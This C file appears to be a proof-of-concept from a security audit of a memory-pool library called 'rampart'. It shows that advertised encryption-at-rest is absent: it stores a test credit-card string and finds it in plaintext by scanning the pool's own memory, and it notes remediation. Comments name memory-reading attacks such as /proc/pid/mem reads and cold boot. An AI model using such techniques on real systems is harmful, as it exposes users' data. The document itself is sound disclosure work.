/**
 * @file poc_01_fake_encryption.c
 * @brief PoC for VULN-001: Non-Functional Encryption
 *
 * VULNERABILITY: Encryption-at-rest is advertised but never implemented.
 *                Data is stored in plaintext despite encryption_enabled=1.
 *
 * CVSS 3.1: 9.8 (Critical)
 * CWE-311: Missing Encryption of Sensitive Data
 *
 * IMPACT: Users believe their data is encrypted when it is not. An attacker
 *         with memory access can read all "encrypted" data in plaintext.
 *
 * LOCATION: src/rampart.c:291-296
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

/* Simulated "attacker" memory scanner */
static int scan_memory_for_pattern(const void *start, size_t len,
                                    const char *pattern) {
    const char *mem = (const char *)start;
    size_t pattern_len = strlen(pattern);
    size_t i;

    for (i = 0; i + pattern_len <= len; i++) {
        if (memcmp(mem + i, pattern, pattern_len) == 0) {
            return 1;  /* Found plaintext */
        }
    }
    return 0;  /* Not found */
}

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    char *sensitive_data;
    const char *secret = "CREDIT_CARD:4111111111111111";
    const unsigned char key[16] = "MySecretKey12345";
    int found_plaintext;

    printf("=== VULN-001: Non-Functional Encryption ===\n\n");

    /* Initialize with encryption ENABLED */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    config.encryption_enabled = 1;
    config.encryption_key = key;
    config.encryption_key_size = 16;

    printf("[*] Creating pool with encryption_enabled=1\n");
    printf("[*] Encryption key: '%s'\n", (const char *)key);

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Failed to create pool: %s\n",
               rampart_error_string(rampart_get_last_error(NULL)));
        return 1;
    }

    printf("[+] Pool created successfully\n\n");

    /* Allocate and store "sensitive" data */
    sensitive_data = (char *)rampart_alloc(pool, 128);
    if (sensitive_data == NULL) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] Storing sensitive data: %s\n", secret);
    strcpy(sensitive_data, secret);

    printf("[*] User believes data is encrypted at rest...\n\n");

    /* ATTACK: Scan memory for plaintext */
    printf("[ATTACK] Attacker scans pool memory for plaintext...\n");

    /*
     * In a real attack, this could be:
     * - Reading /proc/pid/mem
     * - Core dump analysis
     * - Cold boot attack
     * - Exploiting another vuln for memory read
     *
     * Here we demonstrate by scanning the pool memory directly
     * (which we have access to as the same process)
     */
    found_plaintext = scan_memory_for_pattern(pool, config.pool_size, secret);

    printf("\n=== RESULTS ===\n");
    if (found_plaintext) {
        printf("[VULNERABLE] PLAINTEXT DATA FOUND IN 'ENCRYPTED' POOL!\n");
        printf("[!] Encryption is NOT functional.\n");
        printf("[!] Data stored as: %s\n", sensitive_data);
        printf("\n[CRITICAL] Users trusting encryption are exposed!\n");
    } else {
        printf("[SECURE] Plaintext not found in memory scan.\n");
        printf("         (Encryption may be working, or data moved)\n");
    }

    rampart_free(pool, sensitive_data);
    rampart_shutdown(pool);

    printf("\n=== Demonstrative PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Either implement actual encryption in rampart_alloc() using
     * the stored key, or remove the encryption feature entirely
     * and update documentation to prevent false security assumptions.
     */

    return found_plaintext ? 0 : 1;  /* Return 0 if vuln confirmed */
}
